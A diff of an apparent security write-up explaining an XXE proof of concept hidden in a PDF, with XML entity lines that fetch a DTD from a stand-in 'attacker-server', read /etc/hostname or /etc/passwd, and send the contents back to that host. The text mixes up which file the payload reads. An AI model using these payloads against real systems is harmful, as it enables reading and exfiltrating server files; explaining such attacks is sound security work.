@@ -90,7 +90,7 @@ Content of the malicious DTD (poc.dtd):
 
 Here's the breakout from all of this:
 
-The first payload is what I inserted on the PDF file:
+The first payload is what I inserted in the PDF file:
 
 1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.
 
@@ -104,7 +104,11 @@ The `poc.dtd` file, hosted on the attacker's server, contains the actual exfiltr
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-1. <b><!ENTITY % file SYSTEM "file:///etc/passwd"></b>: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the `/etc/hostname` file from the victim server's filesystem.
+1. 
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+```
+The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>`/etc/hostname`</code> file from the victim server's filesystem.
 
 
 
